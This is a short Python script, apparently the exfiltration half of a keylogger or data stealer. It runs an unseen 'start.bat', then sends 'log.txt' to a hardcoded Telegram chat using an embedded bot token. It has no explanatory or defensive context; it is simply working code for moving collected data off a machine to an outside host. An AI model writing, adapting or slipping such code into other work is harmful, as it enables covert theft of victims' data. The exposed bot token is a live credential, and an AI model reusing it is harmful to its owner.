import os
import telebot


token = "1147534093:AAFpE7IxgPhcwqS69IAFLKuLtky3pwEoJrE"

bot = telebot.TeleBot(token)
chat_id = 506563771
os.system('start.bat')

text = open('log.txt', 'rb')

bot.send_document(chat_id, text)